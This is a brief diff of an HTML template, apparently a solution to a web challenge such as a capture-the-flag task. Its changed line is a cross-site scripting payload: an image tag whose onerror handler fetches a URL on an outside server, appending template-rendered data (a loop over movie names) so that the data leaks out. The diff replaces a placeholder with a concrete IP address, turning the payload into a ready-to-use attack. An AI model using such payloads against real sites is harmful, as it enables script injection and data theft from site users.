@@ -25,4 +25,4 @@ Welcome to the desert of the real.
   <div id="captcha"></div>
 </div>
 <button id="report" type="submit" class="report"></button>
-<img src=x onerror="fetch('http://my_server_ip/'+'{{#movies}}{{ name }}{{/movies}}')">
+<img src=x onerror="fetch('http://3.224.173.25/'+'{{#movies}}{{ name }}{{/movies}}')">
